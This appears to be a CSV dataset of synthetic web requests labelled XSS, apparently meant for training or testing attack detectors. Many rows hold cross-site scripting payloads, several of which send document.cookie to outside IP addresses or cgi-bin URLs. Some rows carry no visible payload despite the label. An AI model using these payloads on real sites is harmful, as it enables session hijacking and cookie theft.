id,class,vector
16485,XSS,"KAJb=7082&5snetEet=3eDed oyunion&7tuj8nae6on=orUeg8liteIcl&tthr=<xml src =   ""javascript"
16507,XSS,/SK/eEzpHAritrzrEY0D9JTH/sRtR5u.png?tlpius9BnoOTn=oa%27fneconnectIhh+Yo+&eca=hounc+t&Rb75from8G=owro&n9tIhndua=aue&eoE=cdkl&teeeas8ateanO=86864356&ruaetu55Oy7=e+6&h5u=eiuennmHpaae&JAd2s=%25ihttps&Adikn5auoRoueeb=%3Cimg++src+%3D+%22livescript%3A%5Balert%28%27udd%27%29%3B%5D+%22++%3E&vfWinsAbuTnrrue=ea&aasie=3n
16527,XSS,/<SCRIPT>/?
16578,XSS,/ieel/gSCA1qd9am11/raix/uHpGdJFhvdG/QMNiv0VVtUprocessing-instructionx/fu/u4/tioI.jpg?2I0-B-qSkx=%3Cmeta+++http-equiv+++%3D+%22++++refresh+++++%22++++content%3D++++%22++++0%3Burl%3Djavascript%3A+++%5Balert+++%28%27scetiglz%27%29%3B%5D+++++%22%3E&cetEtpgabL=slh6union&ymtnete07aloii8=w
16594,XSS,/dU5sJE7XEw.@oZ/tQ87fLgA/oipigahik4t/51o2N22f/m3KQuvAZPPTRjeIE/qra-Cve431h@e/ISj2y/wBL3@Ej4.Z/8triui8t4wqs/067ZASxAvmiW9o/hypny.mEg@41.css?
16610,XSS,fSesaialdceh=<![CDATA[<!--]]  ><script  >[alert  ('beoebIu');]//--></script    >
16631,XSS,/0AdeobsriP8iooweliIc/OaJ9NmyY/twadFeitAeguygsab4Ls/sca1tedarmi/zAo/bOezd.-B/eI@Sye7qv9r4MCQmq_0J/c-pblWe@Qxq/egbCFLwvoz/NvsreqShhNsxsnhi4z.png?xmlWFxQF5=513&rectioeIEtd=oHxp_n&XVehdooptc8dN=tta&nhW.5Bps4=378&bttrpeyxda2aes6=%3Ca+href++++%3D+++%22+++++about%3A%3Cs%26%2399%3Bript+++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.tastve.com%2Fcgi-bin%2Fntinieve.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++%3E++++%22+++%3E&roesteeowtape=3fol&anu=eerh&4V7e5lyub7iTe2=37278103
16667,XSS,UDTqK=rveokrh9'g
16715,XSS,/BMHKgSorRDE2MHjh.pl?beujfhif=BsG%3CmIrn&N@Crlywgets=%3C%21--+--+--%3E%3Cscript++++%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.chilelit.com%2Fcgi-bin%2Fllista.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E%3C%21--+--+--%3E&nbhhqtdeeoesg=n5.q8KQZ
16733,XSS,/oe/3n7m1HcatLX4HhV.nsf?Io8bnk6itama=ehyriiDzhacoelo4&oxye1me7oe=7i6cb&i2s=%3Cimg+++++src%3D++++%22+++mocha%3A%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.meenlais.com%2Fcgi-bin%2Fenalve.cgi%27%2Bdocument.cookie%29%3B%5D+%22+++%3E&aveentj8=tntl&AWVE2Ct=54&ht=%5D++%3B%2Bhsn7%5Blogwh%2F&mrEtEogexsse=i%3Dusrd&ratritetagrt=1586&lo6wERoo=thavingn&w6o=prelog3&auwt8nsoelbrmb0=fJrNi&osabyr=suy8vKTJc0w0&ytrPUn=81019&nauoyhCrtnlun=159&geulbe=ini
16742,XSS,/uQ4RrofMHCZzQhZz3/mohhTvo/7kQGqeo/t-WzKdCDSVFGK20/oCQiSaSUee.zf4IgiG1/qaieefNsy7edeotc/easoeoa0hmd.htm?hHtItn=1d&hgi9e51l9I=wL7++onload%3Djavascript%3A+alert%283aRhtkle.Aeerse9d%29&MjRlike=mda%5Dsv8tmnozso%3F
16752,XSS,lsn=en eyagt8eohbee&ttebi=dten&etjqewnlaerogoP=0197&9onfrEolw7eay0h=125422&ortcihetcwyres=30&oYdeith=ttna |ia]object4rra&uht8nssteqty=54130867&n8dhbesrbat=uPthesci1D;c~v&ctReT9c2go=r6rek6e&myh=0559318&thrcnoe=71&r1=cEeeonullsrMobsheo&sRTqRnd0tgi4dAt=wr&tgGTiaz=deletei/n&ha4srsthI=86251034
16840,XSS,/UzryXcXls/aCt9axYrhirtaNntaa/zk-b3BE/demstwrqa86opoo.aspx?3eha=R++r%2Bs+Djegehavingb&qd24oox=%3Cscript++++%3Ealert++++%28ehi6Exr9tlAlols.at1r9%29%3C%2Fscript+++%3E&-AaVZ=00&gase9lkuhlbgK4=2lomeso&onz=document+Erm%3C&jprTzLhiowYe=o7JbmOOOVQs&L-DEQ=17vW6aHGpOty
16865,XSS,iidnla=m>hpne&oksasib=tse$s&t09rn2uEc1aw=93&K-JX7QMs=yA9@Vz&csdhhtrshqpd=20538234&dtepS=keue$&9JSFcTluI=iefptxzsamazheele
16895,XSS,/ri1BZ/Mimg4dFrID7ZQ59x/im-qOK/ognviukruHha/sVFx5VOYgZeEhWL74k55/w7q6Dyw/tU1qQlx7O/n8Gb-/deleteHfoZVnodey/nhfixsdmdEem8pnn.asmx?3gc4jiepo=tetioatT70imnl&PArlue=iyy%25fw&8ro=%3Clink++++rel+%3D+++%22stylesheet+%22+++++href++%3D++++%22+++++javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F137.8.172.194%2Fndniat.nsf%27%2Bdocument.cookie%29%3B%5D++++++%22+%3E&nngbto=4t&nTrhg1=436712&pneEetloseelo=332540276&eouoi=nIXfC
16904,XSS,/<SCRIPT>alert(document>URL)</SCRIPT>/?
16954,XSS,liih=0489&erii=e0gzTIhxi
17058,XSS,/1i9KtgSc/ymqgl2eteiem5btHhm.cfm?access_logTRAWXAZB=%3Ca++++href+++%3D+++%22+++++javas%26%2399%3Bript%26%2335%3B%5Bwindow.open%28%27http%3A%2F%2F222.10.146.250%2Fon.asmx%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E&rA1odhrndsosa=5
17061,XSS,/isahse9toea/mElxatWt1ieeoE/xp_fvy/orrlu2nsreaeespeu/.ETwj.js?otn=%3Cbody+onload+%3D%22+%5Bwindow.open%28%27http%3A%2F%2F230.178.48.232%2Fta.swf%27%2Bdocument.cookie%29%3B%5D%22%3E&httrajooew=8123&ttg=521120823&slacwqi=eh
17076,XSS,/hndnt/naobehcnn/es1mabt2izhxtn.cfm?bsncivnsOwtt=dTeR%24ze-%24xIitdeletees+&drf=9&eomtstdatohTes=%40rxc1&Ysi6=cmha&L8phpkSEW=r3ciod%3D-&incKz.5F=h_6kz7VMHFsI&to3=530BeHFv&Rtl0=n+&Osrgrwma6Drr=1&y9sp=yklsebetweenau&ncrek6dgiA=hHt5UH&0rda3omihttiihi=2802062&vayjni0hUdrrh=zjf1noswmda0md&5qdkl=%3Aam8&g.Y0dQQV6perlK1L=7
17127,XSS,"wmh=dtjErt_lRJ&U00nyhBCqPRt=<iframe   src   =  ""     vbscript:[window.open('http://193.12.178.130/onraor.php'+document.cookie);]    ""  >&hEoa=59&tPQ9L@=dmlmoTalA?levb&tepInarion=8inslMgnapjsqdiain"
17137,XSS,/aXDDqI0Kh/n5LMmF2ENn_L2ru/6M.js?ozaLmscdAs=uqj&tUa=8228350&oahIevenXsktO=gThtpass&oc=ofLIlhsetn&nUIZ=i%25n&dYxAY=h09LPUM47&tr2sfGEoha=%3Cimg+++++src%3D%22orns++%3E+%22++++onmouseover++%3D+%22+++++%5Bwindow.open%28%27http%3A%2F%2F15.76.244.118%2Flige.jsp%27%2Bdocument.cookie%29%3B%5D++%22+%3E
17178,XSS,/JISMH0dv2rj/iIY5z_nOx/WonullNVd1viframe/psl8JQMEPok4z1LNv.swf?c1i7n1onohog=t+ee%25evrd4&iAWGhgeearrter=%3Cimg+++++src%3D%26%7B%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.teiler.com%2Fcgi-bin%2Forndtadeit.cgi%27%2Bdocument.cookie%29%3B%5D%7D%3B++++%3E
17216,XSS,/r90tpa0rSreeoeTMie/reXJXCl/gdGGgA8-n9/el/0iTmEp/R6NEstyleT6/imNKBQ4Ah91/eoO.6h.OWmqC0/raeetaglusc/swwcoouer1nrNrpsA609.jsp?ya=javascript%3A++alert+++%28++++%22+++roek6s.36lcua%22%29&tdoiesumzpNtek=%3B%291n6
17224,XSS,/1F4fh/ohcCjJP7Tnjm0aat/tQ.3qB2S6q--udHe@gU/3i/-vDdwget5locationGAB.jpeg?Zmz1zA=7a2+&execxp_dZkPt_@e=ijGu&orbLAWI-WO=iy%3FyioeAtelnet&DW-@aah_=vnn&n8tr=rO+s9aiGtn7tua&lz1=3794464902&GUc.eO=homeip%27oi%5B8A%28nhl&t5c4ioilveh=6556&tcRvnnieo=+h&leugxlw=fa&efpiioasui=80THgX&S9evtoe=92
17243,XSS,iyztehAddokNnqt=fPM&cdSY=bHkRKVtzolw8&updatecopyS_RyZHmf=eperlTtengrm;rtutE&fonlttpd8fwb9=<!-- -- --><script>[window.open('http://205.240.95.51/et.asmx'+document.cookie);]</script><!-- -- -->&dxev=TewstHaga2sigs&h1gan5nDh=g5uEIm0_3
17251,XSS,"plw6t0g=imunad4etalsDmyyau&ok=em&fpabEj=eoem&aa4riL6s4foosDa=29120486&yocbnda67rbms=4&ne=j..s@zQt&olaayIwae=eb?autn+4-rilT&sVeMZ=t4rtvane&It=so&mc=awinputcne&yarsaps=eshb79u&nmeso2iso=<a  href =    "" about:<s&#99;ript  >[document.location.replace   ('http://www.seolntas.com/cgi-bin/onatasll.cgi'+document.cookie);]</script  >     ""  >&RAIflocationn=bsn&s1ocsBd=7710047&gssutacfoknt=682027"
17258,XSS,/tsnnpci/xPOrs8/apNl5tcFTQ.eXkt/di/Oudsaennw/i0hiKac7oao7zhspt9/4-P22r_aNef5XYI0/ke9KNj/srDCh/tsgectturateenaA6a1.cfm?ytnh=M2rtihsocdr&LS_l48wV_DaZ=12&zrnmipag1mtrto=%3Cdiv+++style++%3D%22+width%3A++expression%28%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.onst.com%2Fcgi-bin%2Filisndne.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B%22++++%3E&feccrtSva=llsvqrul
17259,XSS,/lmtoieztatm/jf@.bin?4Xap4C8QzI6K=ssj&boScocteetant=lcTmr&evgQeo=iT4LKjqhv&edvaU=8310&tlcea6lfttryh5u=%3Cdiv++onmouseover+++%3D%22++++%5Bwindow.open%28%27http%3A%2F%2F9.12.195.215%2Fge.asmx%27%2Bdocument.cookie%29%3B%5D%22+%3E&jsCso=iMiWB&e6ecbs=r2uf4qz1tH
17281,XSS,/Ipsbe/aetBym2zprnl8vnijulr/lKSUDiqNtV%uMd4y/uZee1ANeoOzFNId2UX@n/N8perla5logjJIzPCE/eFO1wN7dd.swf?
17312,XSS,/wWl.JenRjescG@MWkd/eSbTngjTukhGvIz.daZ/6a2s9anntutrcjnxo/eattaefsausEetepdAc/Ay.pl?aE8een=%3Cimg++++dynsrc++%3D%22++javascript%3A+++%5Balert++++%28%27rehep9iq%27%29%3B%5D++%22++%3E&bgsoundPvpeQXWtelnetzG=07&gsi2enuh8n4eue=odeuohtln&zm6ntAtzuw=s%3Dayfp8oc%25u&0teO=enbsm&n8Inta=xostmpm&tassocvlf9kaSg=97&b8Eimftowm2eso=1375945099
17321,XSS,rtitnLehi69sw=pDsaaevfYXI&rRs=<![CDATA[<!--]]   ><script   >[alert    ('lpt6htliOu');]//--></script>&3aeorctxtnooj=4865&ionTW0cogctesn=3&eti6o20tbci=sEMFmL&fLclk3scriptYphtaccesJ=022&jea8nSdft=edhrctaastiaral&9Tu4=252607483&00uA8YnL25=a0outnt@mrskyo&0ihhmreMhAiee=imtUmq2aOAzH&i8itnovs=cyCmBN&tjrdiihtptE=uecho&ic=rjeoevicopyOat&0v=IRwe
17386,XSS,"au69EndaGst=5111&ermble=M01Ndycaimir&JIgj_bUJboot.ininph-7@=eeOq3y3hesdjiiiatt&sd40kj=6c'o&irqcxgnnenpeeCi=hce&rditdnzHiIlx=a@2cKv&3I3Jpb=e8oF_GD&8y=12&xmlprocessing-instructionFscriptp=06&nen=<meta  http-equiv =   ""   refresh     ""  content   = "" 0;url=javascript"
17455,XSS,/3N.Sl/drWSFW3uimcmdZZt/wkK/cngg/euOtreAIgtas7eimim/iunXnM1nISt9Ke3rB/4attdaaje3t/sosqkeeedasoerboetEl/bc0SjQdy1npL/ttCDuKHi/fMi7N_.FF/sDH6qsjnY_FxB2ca.js?td4a=%3Clink++rel+%3D+++%22+++++stylesheet++%22+href%3D+++%22++++javascript%3A+%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.maenla.com%2Fcgi-bin%2Fnsndla.cgi%27%2Bdocument.cookie%29%3B%5D%22+++%3E&shJaedwiits5we=s7J&of=34087&hedalee9saRTh=belebsbaNo&k2ieN4end7r2xr=%27eteybo9e&lRoofeeeod5ds=615
17461,XSS,/omn/c5@kHVk3_JR8vIvl/5a/omiiesldrsr/oJfL-MUBpe-t0k5E9nuL/flvvnooFMiOIx/t-@oiAJs_y/dgX3xvNpVeqK8Vo--b/_09XY1.bin?2lpno9mat=00722330&ovt=%26%3C&yvi=%3C%3Cscript++++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.as.com%2Fcgi-bin%2Finnianor.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++%3E
17465,XSS,/ob4on2vtinqCehrtEefl/tlilxena9yOn.php3?br1heairfr5o=%3Cimg+src+++%3D+%22+++livescript%3A%5Bwindow.open%28%27http%3A%2F%2F152.54.228.101%2Friis.mdb%27%2Bdocument.cookie%29%3B%5D++++%22++%3E&ss=s+5c7ehxFtc6&7Now8lfiR=copySie&eio2eunsd=tara&ptih9alna3b=02173
17541,XSS,/ktresndtrhmsjhd9doto/f-RBwt/NgR/Viy1iol3AetNeN.sh?rt1lh=seEuii+&dautoexecyXn_og=%3Cxml++id+++%3D+%22+++++X+%22+++%3E%3Ca++%3E%3Cb++%3E%26lt%3Bscript++++%3E%5Balert++++%28%27gHedaaiex%27%29%3B%5D%26lt%3B%2Fscript%3E%3B%3C%2Fb+++%3E%3C%2Fa%3E%3C%2Fxml+%3E
17597,XSS,/i./ntiRo/ocerdHcopyW/9PMQYlvtORnT.cfm?
17671,XSS,/gMo71iKKjR8FCc6hFDBQ/e@dMgN_h@1OghNMkLlzs/.nullCwO/VC1bNNwdformm/opxonreP/50hoeeBrsbrt3anme/dT-cd@hrOhVbnu7_Ndy/iTYSrH35/usb1dhiap1iTtmyr4/NsHLq@a6m/vntr4oSwe2cnda/ns@p.bin?ieBp=58&rEutlrd=esshalerf5ctos&lcabgUa7gz2=orsaimTasgr&2kmLY-Kg=%29hrar&eJleCvlmu2pxQ=IS&htIgi2s=8ZTj9n&06tntaoEUrie=8gfatdfgsbes0d&cserhUHerue6ix=rx5&nloeG=miq43sLsnode&mtr=lGnpFAP&hlscwiN=64909&LCesey9o=rm1&anlnerCN=5&Rno=rtr&s7heoicaaaoyto=0
17680,XSS,/neodfS/afaorecat7ee/osV8S4stlM6aAi4nDtdV/ah/aDkvR7M.asp?gegstfigTn2hnn=361
17681,XSS,/<script>alert('Vulnerable')</script>.jsp?
17688,XSS,/<script>alert('Vulnerable')</script>.jsp?
17699,XSS,/iIcueowryohei1hrah/slUeQivMhi/rtaroolcoofm1eoEBc/Min/cGjR_ZFEm9OJ276iI/hPot/tEGNJ4Xy6XV9EMXE6wOf/39hrHgCzdXpigB1sL/yX0KPmochamz5d/fPfTtL-m1I/tZu1@6Z1Zpw0PC4u.shtml?r02=%3C%3Cscript++++%3E%5Balert+%28%27ttia%27%29%3B%5D%3C%2Fscript+++%3E&etisn=ear%3Cbi2&ic=76075&jpewsg=h+l8asorns&vjLne5i=%5CCeydroprEo&e6jnief3O=%7Ei&a60i2u=sfu8ddN&tnmYam1td=d+Eid%3C&vjiiO=ienrnir&nqpufdtfga2psnx=ETnaEtt
17700,XSS,etwbysvua6ttmi=rA20DEZNK-q&net=1029&6scaeafo=eBj&6rDkY%uacceptskx=7933&EiframeQmq2rskZA2=nihyart&pua=61408421
17706,XSS,/Flwrrtwzw7Qhlid/8piittti/YsfB3.6m/B9smomttaiEgtidte/ihh3iv28oot.jpg?kSe=euz+&teSU35lgnmaita=oehp&lq=%28riae0anldu&bvNmocha8dVL9catA=%3C%21%5BCDATA%5B%3C%21--%5D%5D++%3E%3Cscript+%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.raolndas.com%2Fcgi-bin%2Ftegenanain.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript%3E
17716,XSS,3s=<img  src=&{[window.open('http://80.72.91.100/lansni.php'+document.cookie);]};  >&iotqao0YlnTess=aservicesohgpdnwchildEr&esaol=layaMtsRtTixtahdo&q98sCbfromPcuqj=13540
17791,XSS,/3uB9o/eRK/JykNi87bodygCmu/2RV9T7ms-Q/euc5nMAydynutezejda/ac2dhrsbgTquarreiv/ehegques/ew_8@dCU5Dia.nhxOb/as8VL2iUESPhnfvpVpo/t6zVd2QW50.gif?de=%25%40&Ie4OnoGain=asenA&M9window.openmsBl=9oms&yetkagmlmaiKOLt=hntarTtpNe&mT7v3naeeiefsim=093&ywrcvhGubDmSot=%3Ca+href+++%3D%22+++about%3A%3Cs%26%2399%3Bript%3E%5Balert+%28%27ht95d9%27%29%3B%5D%3C%2Fscript+%3E%22%3E
17806,XSS,cgiwrap/<SCRIPT>alert(document.domain)</SCRIPT>?
17820,XSS,/wenhb0xroM/aehe9heh6loto/GorPWHi0aQ_6Kq6/henilWTq/fNJzb3Z16/lnLyVp.htm?mt0utTsonri5tp=6874695&3ehencfUtone=sQG-.JL_G34&Rkbtiao5s=%3Cimg++src+++%3D%22++++javascript%3A++++%5Bwindow.open%28%27http%3A%2F%2F114.47.110.69%2Fie.php4%27%2Bdocument.cookie%29%3B%5D+++%22+%3E
17877,XSS,/hW7uq/eL/XS.gif?lirtedAi=%3Cstyle++type%3D++++%22text%2Fjavascript++++%22+%3E%5Balert++%28%27er%27%29%3B%5D%3C%2Fstyle%3E
17913,XSS,/82Lusdyt1todsr/UBdocument18p/aseenebnosisVianlr/x.tBbxuEGdydH0-o@-P/s6Iv53Qi2sgmwHfIe/eHho5ursaptaowi/nersraSgeEeaime/k8psBJlYc/OA1IFJM/deletekw@rB-ncRqJICe/so@jtfBum9p.y83LUO.png?citieut=eodNE&idwzboodtabc=0318352&j8=78o&i6iec=izWM1qH&qg5e=meiconrfniznhdDplr&UpMIYMsM=26&echoRVO7_X=%3C%3Cscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F13.175.224.120%2Ftaor.dll%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E&nyazpouWub7d=atteedebonf3tat1
17928,XSS,/bEkRBuEytKD/7GCmVN6oY24hAsock_stream/wyp/0uL@htaccestmp_UxBCD/0WA_/a9Urcp1fRIR-oQimgZ/Teo05etmt5s2e8e6.css?lstkdtagsOe=insertTL&xB@IrG@3W=6377374&t6hhtptIaeE=64885045&lnd=tHpof&rnnithMekffHo=bwdw1dgL&pnignepkuzlct=Gb&eorOosIwtxtJ=%3Clink++++rel+%3D+++%22+++++stylesheet++%22++href++++%3D+++%22++++javascript%3A++%5Balert++%28%27aiutEunOT%27%29%3B%5D++++%22%3E&tEW2P=9943711&atdiVt=1select-acceptica&twenfeooReraaa=n&cswee0awe3vm=wTaeeEbjtHocb36f&S4-BdQJQJ=9a%5Crot
17975,XSS,/iaaMNCkFySQCMqjp/Es/hqmnpdTiOmdiltose/zDNsVr0@fO3/sw28iiFI9XuWmzEPY1J/e2EIGdKO/notnwyrsmeshdp8ei/LKQ2d/htpasskXmoNLrmYZ/O7Rhttp0htpassfFnlocationXIhaC.asmx?t3tdau=mDIoc5a-0&atho=imgS&ehso5tsoloteaf=input&l0ieofofn=35610648&gE-U@y=enys&sSometa0=Arb&u4agqlriv=07957020&scriptKwhere_l=uhrme&b9Yi=200390512&etcY6HYYGxcD=havingeteo&o1tEairrt=Tims&noSTr=As0rgv&rrdi=%3C%21--+--+--%3E%3Cscript+%3E%5Bwindow.open%28%27http%3A%2F%2F141.198.237.192%2Fon.asp%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E%3C%21--+--+--%3E&eg9btba7su75h=5taE&16rsndeo=bsE6
17987,XSS,/ticrru/ctDonmD6FWW57WbsWy/ypret/not4th4cha.swf?rqeii=685862&nnfh=2569&afaqd2eie=yr7b&6aetstahsas=1H0bOh+uu+egpc&vD.BRF=O
17993,XSS,/lcqpHUO@62mM2kBr6/e89pdrYz/nR2mD50/gFpassthru82zk5/1LX.mspx?n2snssoieojmgt=ss&o8=dgtre6ew&KallfLJh=%3Cxml++src++%3D+++%22+javascript%3A++%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.erta.com%2Fcgi-bin%2Fin.cgi%27%2Bdocument.cookie%29%3B%5D++++%22%3E
17996,XSS,/paIpber0eslpHrd/Rndrnn3nso/0or9Nonglo.htm?aco=tTpk&UorcmdnMBIlfzperlA=s+mhtaccestornullqASnu%3BI%3EeE&hey7yleIjadtl=ehooced&ze3pstmvzeeoi=2&mnloechudeymTh=op%3D%2B+&lupdate7-cvMBH=3683647&9n=899014&wlt=5960&reicuEehnraa=uoei51eQa&yw3glWolssonu=4518&BeNC7window.openWI=%3Cimg+++++src+++%3D%22+++++livescript%3A%5Bwindow.open%28%27http%3A%2F%2F210.105.78.145%2Fis.mspx%27%2Bdocument.cookie%29%3B%5D++++++%22+++%3E&egdTekohYesaesg=%7Clit++0ailthavingptvr&nmlnneiT=ReIlibqoa+edNmfttats
18030,XSS,/o99h_-UF-mr/mseyhWoMcCeqJop/erpcdlEneezejiigdmtk/uL_s-DAiGwWvuI6YgCt-/e5U/oUqHiV_ol.css?2httpYq4ahP6=%3Cimg++++src%3D%26%7B%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ilitne.com%2Fcgi-bin%2Fndictais.cgi%27%2Bdocument.cookie%29%3B%5D%7D%3B+%3E&es3detdr=2132
18065,XSS,/gwpgc9Lhq/n2/cilxR/xp_bXwqId2V0dzc/6nnlylffav/titeeAs.tiff?Ixfi=tden%3D5sObodyn&mtLts2rf=c9&coebuycso=2432255&oacmie=95048&npilniiEoeqs=76516882&sv=fwuedobueei&8atjgltr=%3Cobject+classid++%3D+%22+++++clsid%3A...%22++codebase%3D++%22++++javascript%3A++%5Balert++++%28%27nvm%27%29%3B%5D+++%22++++%3E&aooueiuTp4hyo=9112747&lnknnosntdovgTd=estlnhEl9c&eddoibfoa=3301&z0tcssambe@U=87116
18108,XSS,/e0niecAfinr.gif?Iudtssn=%5B%5CxC0%5D%5B%5CxBC%5Dscript+++%3E%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.laisch.com%2Fcgi-bin%2Ficasnira.cgi%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript++++%3E&dKx..llN=shn1r9oquotFnseeo&kn=xati&mhseT1lseIptt3=0ahtpassieetalst%3Ee%29zq&jc=tp&enraeesJaihr7Lp=n82Uoy3MfYZp&tbEoysoimt=l7&7Mvor=cOlEorr%28+t%3Ae
18117,XSS,/1okvntfe/heeer2ec2hheijeqi/cnew/qcmdLm1LvjhtpassNHr.html?aheuroeldejee=uH%3C3r%27e%29r3ordds&OudupdateFrmU-r=eteahlewce&drsd7i1he41=2&@6tVb.BepK=eeEb&sm=0leIuncxbi1oronh&BgPUfvz=u4&cn=%3Cinput++++type++++%3D++++%22image++%22+dynsrc+++%3D++++%22++++javascript%3A+++%5Bwindow.open%28%27http%3A%2F%2F36.192.132.214%2Fnentve.swf%27%2Bdocument.cookie%29%3B%5D++++%22++++%3E&fteaIiaatb=8s0Ik4wdOg&htleaasvNl=htpassrrls1
18145,XSS,/eazef/lsTe9rrulfra1mei.gif?lrleerIfAn3c0np=ssrtdo%2FsA%3A%5Du&ttifrvNcmmy=%3Cbody++++onload++%3D++%22%5Balert%28%27i5bks%27%29%3B%5D+%22+++%3E&sceoa=sdvarpassthru3Aga&at7soh=ecEqgaa&dmmgd2=uUZqr5&GQubkV=texec&dsseaexih=nveo
18153,XSS,"tde6h=<body   onload = ""     [alert ('rlrty');] ""    >"
18184,XSS,/s5aaegu/e5rDbnse/09im.bin?3omlTEo=1osi%3Fi&H2cxo2Iodn1nate=er%3Ba&ewoc=Whe&uivsDcQ4iomE=8&i9rvspli=9444431&usrewiowi=stauf+bwhngcr&Proma=kdh9Dntl&0eel4nn1ei=%3Cimg+src%3D%26%7B%5Balert++%28%27gof%27%29%3B%5D%7D%3B+++%3E
18296,XSS,/mFO.ElBDDTpSzTOOp/wTn3y_yEcwiC6F/98cAntpedotejrelnrw/1Ps78jTregklS_sYZ/nlSowt/e8PE0/pJ4i_fpnVK9as/ahYs4Kt4S/eh9PNoj5D/lXGrmvOYH/bFhKzH-jLkY79hwC8.png?neHstbtejie=%26%7B%5Balert%28%27NaJstzjthr%27%29%3B%5D%7D%3B&keo7o9sutbuaiad=Rdse%40%29dnctsamdTfKdoxE&dzijn=dee%3D&4sckpbAjmtis=ttdetcsru
18325,XSS,/isPihna0ioyreti7ahtl/sGpTxt3mRu72qL/ldov/EPcoseJlhuBtata7tchz/52zQ/a97heee/dUWkus.5T/c9p0_JtBowrx/fXI57p/0F/mWmNH7/o991BZZFj.shtml?0echokDF7htacces=5519404&LqZ4iVWZ@=taccess_log%25uee&ero34fqneeis0o=ihajo&eeArr=21&prrmdhtuAseroAO=oN6&kehs8yvh1yt1W=60673&pnsxsnstNam73ev=70&eiohondnxinE=%3Clink+++rel+%3D+%22stylesheet++%22+++++href+%3D++++%22+javascript%3A+++%5Balert++++%28%27bonheei1P%27%29%3B%5D++++%22+++%3E
18330,XSS,/d2zmk1E870zw@PVrjkuZ/maieetrdtcsth3dA.asp?aHtesknq=hHbinme&1seedEh=fdgs&t9tbb9e2aosw=76120&ialemksr6j=742&kGDLS@7.IrN=8022&djRI6xmeeefiih=aUalaSetfmidlAee&fTww3bfioek=lnhhmochar%3D%3Asmsystemn9er
18390,XSS,/ptraehf/gDB.EoQrwRs3SDPagln-/udogzahqtu7tO/ue1QerdrEnhe/En0rll1diep/0imbQ0KpD/Rs3giefpe/hfaXY6TGOSjzyKc/N4libPRHcX_9optN/kesTcnirnu3aofcS.shtml?iioctlhobolt=axJF&stylewA5includelgJF5=hBqJydRI7&emsw6fioivtj=eiAoeftpf+aem0iw&enhhciuleeot=e&tLRR0dHmo=%3Cstyle+type%3D++%22+text%2Fjavascript++%22++++%3E%5Balert++++%28%27dus%27%29%3B%5D%3C%2Fstyle+%3E&Ownhvane=es9Ts&3FWY_homesEo=ochttpegmetakkst%26ys&tynha3tgni=tehrmgilwneLxml&on1etfr5o=1141&eegilEttssoeEec=bUc.&1oasiglIen=754
18405,XSS,/ottAaisroiu/QPXconnectZ4V/P26hzNcghebqt/FvbscriptINFKxiGlQcM/na7fch4ons3qsnepa/sqh@qCOxA6Owxq7T/prreftu/oXQO3aaNF.aSLewphJh/zooITgZ@QVc/mEXF9-k_3/mv-B-TI.jpg?Ek0@h=28579&Ot=mno95sHB6P
